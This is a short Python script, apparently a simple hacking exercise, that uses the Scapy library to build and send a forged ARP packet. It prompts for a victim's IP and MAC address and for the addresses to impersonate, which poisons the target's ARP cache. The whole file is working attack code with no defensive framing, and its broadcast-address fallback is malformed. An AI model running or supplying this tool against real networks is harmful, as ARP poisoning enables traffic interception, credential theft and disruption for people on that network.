#/usr/bin/env python
from scapy.all import *

def getIPHW():
    ip_dst = raw_input("Enter the IP address for which you want poison")
    hw_dst = raw_input("Enter the HW address for which you want poison")
    ip_src = raw_input("Enter the IP address with which you want to poison")
    hw_src = raw_input("Enter the HW address with which you want to poison")
    params = []
    params.append(ip_dst)
    params.append(hw_dst)
    params.append(ip_src)
    params.append(hw_src)
    return params

def sendARP():
    arp_packet = ARP()
    params = getIPHW()
    arp_packet.pdst = params[0]
    if params[1] == '':
        params[1] = "ff.ff.ff.ff.ff.ff"
    arp_packet.hwdst = params[1]
    arp_packet.psrc = params[2]
    arp_packet.hwsrc = params[3]
    send(arp_packet)


if __name__=='__main__':
    sendARP()
